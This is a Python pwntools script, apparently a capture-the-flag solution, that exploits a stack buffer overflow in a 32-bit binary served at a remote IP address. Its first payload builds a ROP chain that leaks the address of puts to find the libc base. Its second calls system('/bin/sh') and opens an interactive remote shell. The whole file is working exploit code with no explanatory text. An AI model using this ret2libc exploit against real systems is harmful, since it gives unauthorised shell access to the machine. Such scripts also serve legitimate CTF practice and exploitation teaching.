#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *
import binascii
debug = False
if debug:
	io = process("./pwn")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn")
else:
	io = remote("117.50.60.184","12345")
	libc = ELF("./libc-2.23.so")
	elf = ELF("./pwn")

def sendpayload(payload):
	io.sendlineafter("First, what's your name?\n","s")
	io.sendlineafter("do you want to get flag?\n",payload)

#gdb.attach(io,"b *0x08048607")
puts_got = 0x08048480
popebp_ret = 0x0804879b
main_got = 0x080486be
char_num = 0x1C
payload1 = char_num*"a" + "junk" + p32(puts_got) + p32(popebp_ret) + p32(elf.got["puts"]) + p32(main_got)
sendpayload(payload1)
puts_addr = u32(io.recv(4))
log.info("puts_addr:"+hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"]
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
log.info("system_addr:"+hex(system_addr))
log.info("binsh_addr:"+hex(binsh))
payload2 = char_num*"a" + "junk" + p32(system_addr) + "junk" + p32(binsh)
sendpayload(payload2)
io.interactive()
